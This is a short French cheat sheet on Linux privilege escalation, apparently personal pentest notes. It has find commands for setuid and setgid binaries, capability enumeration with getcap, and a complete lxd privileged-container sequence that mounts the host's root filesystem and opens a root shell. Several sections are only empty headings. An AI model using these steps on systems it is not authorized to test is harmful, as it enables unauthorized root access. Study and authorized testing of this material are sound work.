# Information Gathering
## Enumeration de l'environnement 

L'énumération est la clé de l'escalade de privilèges. Plusieurs scripts d'assistance (tels que LinPEAS et LinEnum) existent pour aider à l'énumération. 
- Version de l'OS : Connaître la distribution (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.)
- Version du noyau : Comme pour la version de l'OS, il peut exister des exploits publics qui ciblent une vulnérabilité dans une version spécifique du noyau.
- Services en cours d'exécution : Il est important de savoir quels services sont en cours d'exécution sur l'hôte, en particulier ceux qui s'exécutent en tant que root. 


## Permissions Spéciales

La permission Set User ID upon Execution (setuid) peut permettre à un utilisateur d'exécuter un programme ou un script avec les permissions d'un autre utilisateur, généralement avec des privilèges élevés.

```
 find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

La permission Set-Group-ID (setgid) est une autre permission spéciale qui nous permet d'exécuter des binaires comme si nous faisions partie du groupe qui les a créés.

```
find / -uid 0 -perm -6000 -type f 2>/dev/null

find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits

## GTFOBins

Le projet GTFOBins est une liste organisée de binaires et de scripts qui peuvent être utilisés par un attaquant pour contourner les restrictions de sécurité.


## Capacities 

Les capacités (capabilities) Linux sont une fonctionnalité de sécurité du système d'exploitation Linux qui permet d'accorder des privilèges spécifiques à des processus, les autorisant à effectuer des actions spécifiques qui seraient autrement restreintes. 

Énumération des capacités

```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

Cette commande mono-ligne utilise la commande find pour rechercher tous les exécutables binaires dans les répertoires où ils se trouvent généralement, puis utilise l'option -exec pour exécuter la commande getcap sur chacun d'eux, affichant les capacités qui ont été définies pour ce binaire. La sortie de cette commande affichera une liste de tous les exécutables binaires sur le système, ainsi que les capacités qui ont été définies pour chacun.

Exploitation

Si nous avons obtenu l'accès au système avec un compte à faibles privilèges, puis découvert la capacité cap_dac_override :

```
getcap /usr/bin/vim.basic
```


## Abuse des taches Cron

## lxd


```

lxc image list
lxc init ubuntutemp privesc -c security.privileged=true

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
ls -l /mnt/root

```


### Docker 

Docker est un outil open-source populaire qui fournit un environnement d'exécution portable et cohérent pour les applications logicielles.

Capture passive de trafic